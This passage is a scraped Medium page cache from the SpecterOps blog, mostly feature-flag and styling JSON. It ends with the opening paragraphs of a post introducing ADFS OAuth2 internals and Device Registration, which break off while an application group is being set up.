lag","name":"enable_rito_upstream_deadlines","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_rating_prompt_stories_read_threshold","valueType":{"__typename":"VariantFlagNumber","value":2}},{"__typename":"VariantFlag","name":"enable_braintree_integration","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"reengagement_notification_duration","valueType":{"__typename":"VariantFlagNumber","value":3}},{"__typename":"VariantFlag","name":"enable_lite_homepage","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_sharer_validate_post_share_key","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_iceland_nux","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_app_flirty_thirty","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_paypal","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_hybrid_ranking_model","valueType":{"__typename":"VariantFlagString","value":"experiment"}},{"__typename":"VariantFlag","name":"browsable_stream_config_bucket","valueType":{"__typename":"VariantFlagString","value":"curated-topics"}},{"__typename":"VariantFlag","name":"enable_publication_hierarchy_web","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_iceland_forced_android","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_moc_load_processor_c","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_newsletter_lo_flow_custom_domains","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_lists_v2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_friend_links_postpage_banners","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_google_one_tap","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_see_pronouns","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"reader_fair_distribution_non_qp","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_entities_to_follow_v2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_plans_page_payment_form","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"enable_pub_featuring","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_topic_portals","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_editor_new_publishing_flow","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_webhook","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_susi_redesign_ios","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_boost_nia_v01","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_marketing_emails","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_winback_promotion_email","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"disable_partner_program_enrollment","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_easy_resubscribe","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tribute_landing_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"allow_test_auth","valueType":{"__typename":"VariantFlagString","value":"disallow"}},{"__typename":"VariantFlag","name":"available_monthly_premium_plan","valueType":{"__typename":"VariantFlagString","value":"12a660186432"}},{"__typename":"VariantFlag","name":"enable_android_verified_author","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_medium2_kbfd","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_pp_country_expansion","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ranker_v10","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"enable_footer_app_buttons","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_sprig","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"num_post_bottom_responses_to_show","valueType":{"__typename":"VariantFlagNumber","value":3}},{"__typename":"VariantFlag","name":"enable_moc_load_processor_all_recs_surfaces","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_seamless_social_sharing","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_lock_responses","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_autorefresh","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_display_paywall_after_onboarding","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_android_offline_reading","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_configure_pronouns","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_server_upstream_deadlines","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"skip_fs_cache_user_vals","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"available_monthly_plan","valueType":{"__typename":"VariantFlagString","value":"60e220181034"}},{"__typename":"VariantFlag","name":"enable_braintree_trial_membership","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_creator_welcome_email","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_recirc_model","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_switch_plan_premium_tier","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_android_dynamic_programming_paywall","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_android_miro_v2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_legacy_feed_in_iceland","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_rex_aggregator_v2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_cache_less_following_feed","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_publish_permission_check","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_eventstats_event_processing","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_import","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"allow_access","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ml_rank_rex_anno","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_updated_pub_recs_ui","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_apple_sign_in","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_new_stripe_customers","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_sharer_create_post_share_key","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tipping_v0_android","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"limit_user_follows","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_group_gifting","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"signup_services","valueType":{"__typename":"VariantFlagString","value":"twitter,facebook,google,email,google-fastidv,google-one-tap,apple"}},{"__typename":"VariantFlag","name":"enable_rex_reading_history","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tag_recs","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_diversification_rex","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_intrinsic_automatic_actions","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_pp_v4","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tick_landing_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_social_share_sheet","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_members_only_audio","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_update_explore_wtf","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_verifications_service","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"glyph_font_set","valueType":{"__typename":"VariantFlagString","value":"m2-unbound-source-serif-pro"}},{"__typename":"VariantFlag","name":"ios_enable_home_post_menu","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_google_webhook","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_offline_reading","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_in_app_free_trial","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"allow_signup","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_continue_this_thread","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_apple_webhook","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_premium_tier_badge","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_update_topic_portals_wtf","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"onboarding_tags_from_top_views","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_auto_follow_on_subscribe","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_dynamic_paywall_programming","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_author_cards","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_new_manage_membership_flow","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_bottom_responses_native","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tipping_v0_ios","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"goliath_externalsearch_enable_comment_deindexation","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_two_hour_refresh","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_friend_links_postpage_banners","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_conversion_model_v2","valueType":{"__typename":"VariantFlagString","value":"group_2"}},{"__typename":"VariantFlag","name":"enable_lite_response_markup","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_maim_the_meter","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"limit_post_referrers","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_friend_links_creation","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"price_smoke_test_monthly","valueType":{"__typename":"VariantFlagString","value":""}},{"__typename":"VariantFlag","name":"enable_cancellation_discount_v1_gate","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_conversion_ranker_v2","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"enable_mastodon_avatar_upload","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_starspace","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_trust_service_recaptcha","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_google_pay","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"available_annual_premium_plan","valueType":{"__typename":"VariantFlagString","value":"4a442ace1476"}},{"__typename":"VariantFlag","name":"can_receive_tips_v0","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_android_dynamic_aspirational_paywall","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_author_cards_byline","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_aurora_pub_follower_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_mastodon_for_members_username_selection","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_bottom_responses","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_susi_redesign_android","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_pre_pp_v4","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_simplified_digest_v2_b","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_remove_twitter_onboarding_step","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"price_smoke_test_yearly","valueType":{"__typename":"VariantFlagString","value":""}},{"__typename":"VariantFlag","name":"enable_lite_archive_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_abandoned_cart_promotion_email","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_pill_based_home_feed","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_recommended_publishers_query","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_automod","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_sms_verification_for_publish","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_speechify_widget","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"textshots_userid","valueType":{"__typename":"VariantFlagString","value":""}},{"__typename":"VariantFlag","name":"enable_deprecate_legacy_providers_v3","valueType":{"__typename":"VariantFlagBoolean","value":true}}],"collectionByDomainOrSlug({\"domainOrSlug\":\"posts.specterops.io\"})":{"__ref":"Collection:f05f8696e3cc"},"postResult({\"id\":\"c11f9b371811\"})":{"__ref":"Post:c11f9b371811"}},"ImageMetadata:1*D-FDlfkqivRBQZoESrwtqw.png":{"__typename":"ImageMetadata","id":"1*D-FDlfkqivRBQZoESrwtqw.png"},"Collection:f05f8696e3cc":{"__typename":"Collection","id":"f05f8696e3cc","favicon":{"__ref":"ImageMetadata:1*D-FDlfkqivRBQZoESrwtqw.png"},"customStyleSheet":null,"colorPalette":{"__typename":"ColorPalette","highlightSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FFFFFFFF","colorPoints":[{"__typename":"ColorPoint","color":"#FFF3F1FF","point":0},{"__typename":"ColorPoint","color":"#FFF1EFFF","point":0.1},{"__typename":"ColorPoint","color":"#FFEEEDFF","point":0.2},{"__typename":"ColorPoint","color":"#FFECEBFF","point":0.3},{"__typename":"ColorPoint","color":"#FFEAE9FF","point":0.4},{"__typename":"ColorPoint","color":"#FFE8E7FF","point":0.5},{"__typename":"ColorPoint","color":"#FFE5E4FF","point":0.6},{"__typename":"ColorPoint","color":"#FFE3E2FF","point":0.7},{"__typename":"ColorPoint","color":"#FFE1E0FF","point":0.8},{"__typename":"ColorPoint","color":"#FFDEDEFF","point":0.9},{"__typename":"ColorPoint","color":"#FFDCDCFF","point":1}]},"defaultBackgroundSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FFFFFFFF","colorPoints":[{"__typename":"ColorPoint","color":"#FF8080B7","point":0},{"__typename":"ColorPoint","color":"#FF7777A8","point":0.1},{"__typename":"ColorPoint","color":"#FF6E6E9A","point":0.2},{"__typename":"ColorPoint","color":"#FF65658B","point":0.3},{"__typename":"ColorPoint","color":"#FF5C5B7D","point":0.4},{"__typename":"ColorPoint","color":"#FF52526E","point":0.5},{"__typename":"ColorPoint","color":"#FF484860","point":0.6},{"__typename":"ColorPoint","color":"#FF3D3D51","point":0.7},{"__typename":"ColorPoint","color":"#FF323241","point":0.8},{"__typename":"ColorPoint","color":"#FF262632","point":0.9},{"__typename":"ColorPoint","color":"#FF191921","point":1}]},"tintBackgroundSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FF1E184B","colorPoints":[{"__typename":"ColorPoint","color":"#FF1E184B","point":0},{"__typename":"ColorPoint","color":"#FF3A3866","point":0.1},{"__typename":"ColorPoint","color":"#FF54537D","point":0.2},{"__typename":"ColorPoint","color":"#FF6C6C93","point":0.3},{"__typename":"ColorPoint","color":"#FF8383A6","point":0.4},{"__typename":"ColorPoint","color":"#FF9999B9","point":0.5},{"__typename":"ColorPoint","color":"#FFAEAECA","point":0.6},{"__typename":"ColorPoint","color":"#FFC3C2DB","point":0.7},{"__typename":"ColorPoint","color":"#FFD8D6EB","point":0.8},{"__typename":"ColorPoint","color":"#FFEBEAFA","point":0.9},{"__typename":"ColorPoint","color":"#FFFFFDFF","point":1}]}},"domain":"posts.specterops.io","slug":"specter-ops-posts","googleAnalyticsId":"UA-102239211-2","name":"Posts By SpecterOps Team Members","subscriberCount":4880,"description":"Posts from SpecterOps team members on various topics relating information security","avatar":{"__ref":"ImageMetadata:1*D-FDlfkqivRBQZoESrwtqw.png"},"latestPostsConnection({\"paging\":{\"limit\":1}})":{"__typename":"PostConnection","posts":[{"__ref":"Post:5942e70e05ab"}]},"viewerEdge":{"__ref":"CollectionViewerEdge:collectionId:f05f8696e3cc-viewerId:lo_d134ff824f72"},"twitterUsername":"specterops","facebookPageId":null,"logo":{"__ref":"ImageMetadata:1*s-5BWBr8XsgtIU5azKNhZQ.jpeg"}},"User:b206c297df42":{"__typename":"User","id":"b206c297df42","customDomainState":null,"hasSubdomain":false,"username":"jaredcatkinson"},"Post:5942e70e05ab":{"__typename":"Post","id":"5942e70e05ab","firstPublishedAt":1736265995888,"creator":{"__ref":"User:b206c297df42"},"collection":{"__ref":"Collection:f05f8696e3cc"},"isSeries":false,"mediumUrl":"https:\u002F\u002Fposts.specterops.io\u002Fpart-15-function-type-categories-5942e70e05ab","sequence":null,"uniqueSlug":"part-15-function-type-categories-5942e70e05ab"},"LinkedAccounts:94749d3f8afc":{"__typename":"LinkedAccounts","mastodon":null,"id":"94749d3f8afc"},"User:94749d3f8afc":{"__typename":"User","id":"94749d3f8afc","linkedAccounts":{"__ref":"LinkedAccounts:94749d3f8afc"},"isSuspended":false,"name":"Adam Chester","imageId":"1*UTZD7k5oVTNVGjNXZjwpYw.jpeg","customDomainState":null,"hasSubdomain":false,"username":"xpnsec","verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":10,"followingCount":1,"collectionFollowingCount":0},"bio":"Hacker @ SpecterOps https:\u002F\u002Fblog.xpnsec.com\u002F","membership":null,"allowNotes":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:94749d3f8afc-viewerId:lo_d134ff824f72"},"twitterScreenName":""},"Paragraph:6c2350f1b8ff_0":{"__typename":"Paragraph","id":"6c2350f1b8ff_0","name":"6f07","type":"H3","href":null,"layout":null,"metadata":null,"text":"ADFS — Living in the Legacy of DRS","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_1":{"__typename":"Paragraph","id":"6c2350f1b8ff_1","name":"1bf6","type":"P","href":null,"layout":null,"metadata":null,"text":"It’s no secret that Microsoft have been trying to move customers away from ADFS for a while. Short of slapping a “deprecated” label on it, every bit of documentation I come across eventually explains why Entra ID should now be used in place of ADFS.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_2":{"__typename":"Paragraph","id":"6c2350f1b8ff_2","name":"0e53","type":"P","href":null,"layout":null,"metadata":null,"text":"And yet… we still encounter it everywhere! Even in organisations that have embraced Entra ID, we have Hybrid Joined environments which often mix federated authentication in with cloud management. So while it’s nice to chase the shiny new thing, building knowledge around ADFS is still a worthwhile way to spend an evening.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_3":{"__typename":"Paragraph","id":"6c2350f1b8ff_3","name":"d30b","type":"P","href":null,"layout":null,"metadata":null,"text":"So in this post we’re going to focus on some ADFS internals. We’ll be staying clear of the SAML areas which have been beaten to death, and instead we’re going to look at OAuth2, and how it underpins the analogues to Entra ID security features like Device Registration and Primary Refresh Tokens.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_4":{"__typename":"Paragraph","id":"6c2350f1b8ff_4","name":"10e3","type":"P","href":null,"layout":null,"metadata":null,"text":"I’m honestly not sure how useful any of this post will be in a practical sense. I’ve tried to gather data on internet facing ADFS servers to see what configurations are out there to help hone my research, but I found this area way too interesting to leave on my Notion notebook to rot.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_5":{"__typename":"Paragraph","id":"6c2350f1b8ff_5","name":"a06a","type":"P","href":null,"layout":null,"metadata":null,"text":"So if a single person is able to make use of this content to achieve their objective in a future assessment, or just to understand why the msDS-Device object exists, it was worth posting.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":139,"end":150,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_6":{"__typename":"Paragraph","id":"6c2350f1b8ff_6","name":"2d6f","type":"H3","href":null,"layout":null,"metadata":null,"text":"ADFS and OAuth2","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_7":{"__typename":"Paragraph","id":"6c2350f1b8ff_7","name":"59f2","type":"P","href":null,"layout":null,"metadata":null,"text":"You’d be forgiven for thinking that ADFS is primary a SAML token generator. After all, most post-ex techniques focus on areas like Golden SAML, having been used with success on countless engagements over the years.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_8":{"__typename":"Paragraph","id":"6c2350f1b8ff_8","name":"76f6","type":"P","href":null,"layout":null,"metadata":null,"text":"But the other side to ADFS is OAuth2. Of course there is a coating of “Microsoft Stank” (as my colleague @hotnops likes to call it when presenting research into some Entra ID madness) applied to the terms that Microsoft use, but it’s very much an OAuth2 provider under the hood.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":105,"end":113,"href":"https:\u002F\u002Fx.com\u002Fhotnops","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_9":{"__typename":"Paragraph","id":"6c2350f1b8ff_9","name":"28a2","type":"P","href":null,"layout":null,"metadata":null,"text":"I’ll begin by giving a very quick overview of OAuth2 on ADFS to set the stage for what we will discuss later on.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_10":{"__typename":"Paragraph","id":"6c2350f1b8ff_10","name":"58cd","type":"P","href":null,"layout":null,"metadata":null,"text":"Let’s start with how to set up a simple OAuth2 integration. In the ADFS management console we have “Application Groups”:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*HBGWGtOyrx-eoCK9AtSpMQ.png":{"__typename":"ImageMetadata","id":"1*HBGWGtOyrx-eoCK9AtSpMQ.png","originalHeight":688,"originalWidth":1256,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_11":{"__typename":"Paragraph","id":"6c2350f1b8ff_11","name":"adde","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*HBGWGtOyrx-eoCK9AtSpMQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_12":{"__typename":"Paragraph","id":"6c2350f1b8ff_12","name":"8a07","type":"P","href":null,"layout":null,"metadata":null,"text":"This is where ADFS allows configuration of OAuth2 clients and servers. We’ll set up a new Application Group and call it “Test App Group”, where we’ll be presented with a number of templates:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*WI_sCNTMJsjv75CjmXQUfg.png":{"__typename":"ImageMetadata","id":"1*WI_sCNTMJsjv75CjmXQUfg.png","originalHeight":1168,"originalWidth":1438,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_13":{"__typename":"Paragraph","id":"6c2350f1b8ff_13","name":"83e5","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*WI_sCNTMJsjv75CjmXQUfg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_14":{"__typename":"Paragraph","id":"6c2350f1b8ff_14","name":"dcf1","type":"P","href":null,"layout":null,"metadata":null,"text":"Microsoft provide an overview of each template via the “More information” button, but this table from the documentation provides a useful set of translations to understand Microsoft’s OAuth2 terminology:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":86,"end":90,"href":"https:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fwindows-server\u002Fidentity\u002Fad-fs\u002Foverview\u002Fad-fs-openid-connect-oauth-flows-scenarios","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*ecjClrTAuXcmxXVnfCBRMQ.png":{"__typename":"ImageMetadata","id":"1*ecjClrTAuXcmxXVnfCBRMQ.png","originalHeight":593,"originalWidth":2048,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_15":{"__typename":"Paragraph","id":"6c2350f1b8ff_15","name":"5350","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*ecjClrTAuXcmxXVnfCBRMQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_16":{"__typename":"Paragraph","id":"6c2350f1b8ff_16","name":"4499","type":"P","href":null,"layout":null,"metadata":null,"text":"For now, let’s choose the “Web browser accessing a web application” template. We’ll use the ClaimsXRay.net web application as our target, which is a nice application used to test IdP integrations (modelled after Microsoft’s own deprecated ClaimsXRay service).","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":92,"end":106,"href":"http:\u002F\u002FClaimsXRay.net","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_17":{"__typename":"Paragraph","id":"6c2350f1b8ff_17","name":"8489","type":"P","href":null,"layout":null,"metadata":null,"text":"On the next screen we need to assign the Client Identifier and redirect URI which we’ll set to 